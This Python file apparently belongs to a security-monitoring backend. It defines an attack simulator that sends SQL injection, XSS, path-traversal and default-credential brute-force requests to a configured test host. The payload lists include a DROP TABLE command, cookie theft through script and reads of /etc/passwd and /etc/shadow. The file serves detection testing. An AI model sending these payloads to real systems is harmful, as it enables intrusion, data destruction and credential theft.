import asyncio
import logging
import aiohttp
from backend.config import settings

logger = logging.getLogger(__name__)

SQL_PAYLOADS = [
    "/login?user=' OR '1'='1--&pass=x",
    "/search?q=1' UNION SELECT username,password FROM users--",
    "/item?id=1; DROP TABLE users--",
    "/api/user?id=1' OR 1=1--",
]

XSS_PAYLOADS = [
    "/search?q=<script>alert('xss')</script>",
    "/comment?text=<img src=x onerror=alert(1)>",
    "/name?v=javascript:alert(document.cookie)",
]

PATH_TRAVERSAL_PAYLOADS = [
    "/file?name=../../../../etc/passwd",
    "/download?path=../../../etc/shadow",
    "/static/%2e%2e%2f%2e%2e%2fetc%2fpasswd",
]

BRUTE_FORCE_CREDS = [
    ("admin", "password"), ("admin", "123456"), ("admin", "admin"),
    ("root", "root"), ("user", "pass"), ("test", "test"),
]


class AttackSimulator:
    """Simulates attacks against the test application ONLY."""

    def __init__(self):
        self._stop = False
        # Resolved at instantiation time so env vars are already loaded
        self._target_base = f"http://{settings.SCAN_TARGET_HOST}:{settings.SCAN_TARGET_PORT}"

    def stop(self):
        self._stop = True

    async def run_all(self) -> dict:
        self._stop = False
        results = {}
        results["sql_injection"] = await self.simulate_sql_injection()
        if self._stop:
            return results
        await asyncio.sleep(1)
        results["xss"] = await self.simulate_xss()
        if self._stop:
            return results
        await asyncio.sleep(1)
        results["path_traversal"] = await self.simulate_path_traversal()
        if self._stop:
            return results
        await asyncio.sleep(1)
        results["brute_force"] = await self.simulate_brute_force()
        return results

    async def simulate_sql_injection(self) -> dict:
        logger.info("Simulating SQL injection attacks...")
        sent = 0
        async with aiohttp.ClientSession() as session:
            for payload in SQL_PAYLOADS:
                if self._stop:
                    break
                try:
                    url = self._target_base + payload
                    async with session.get(url, timeout=aiohttp.ClientTimeout(total=5)) as resp:
                        sent += 1
                        logger.debug(f"SQLi payload sent: {payload} -> {resp.status}")
                except Exception as e:
                    logger.debug(f"SQLi request error: {e}")
                await asyncio.sleep(0.3)
        return {"type": "SQL_INJECTION", "payloads_sent": sent}

    async def simulate_xss(self) -> dict:
        logger.info("Simulating XSS attacks...")
        sent = 0
        async with aiohttp.ClientSession() as session:
            for payload in XSS_PAYLOADS:
                if self._stop:
                    break
                try:
                    url = self._target_base + payload
                    async with session.get(url, timeout=aiohttp.ClientTimeout(total=5)) as resp:
                        sent += 1
                except Exception:
                    pass
                await asyncio.sleep(0.3)
        return {"type": "XSS", "payloads_sent": sent}

    async def simulate_path_traversal(self) -> dict:
        logger.info("Simulating path traversal attacks...")
        sent = 0
        async with aiohttp.ClientSession() as session:
            for payload in PATH_TRAVERSAL_PAYLOADS:
                if self._stop:
                    break
                try:
                    url = self._target_base + payload
                    async with session.get(url, timeout=aiohttp.ClientTimeout(total=5)) as resp:
                        sent += 1
                except Exception:
                    pass
                await asyncio.sleep(0.3)
        return {"type": "PATH_TRAVERSAL", "payloads_sent": sent}

    async def simulate_brute_force(self, attempts: int = 8) -> dict:
        logger.info("Simulating brute force attack...")
        sent = 0
        async with aiohttp.ClientSession() as session:
            for i in range(min(attempts, len(BRUTE_FORCE_CREDS))):
                if self._stop:
                    break
                user, pwd = BRUTE_FORCE_CREDS[i % len(BRUTE_FORCE_CREDS)]
                try:
                    async with session.post(
                        self._target_base + "/login",
                        data={"username": user, "password": pwd},
                        timeout=aiohttp.ClientTimeout(total=5),
                    ) as resp:
                        sent += 1
                except Exception:
                    pass
                await asyncio.sleep(0.2)
        return {"type": "BRUTE_FORCE", "attempts_sent": sent}
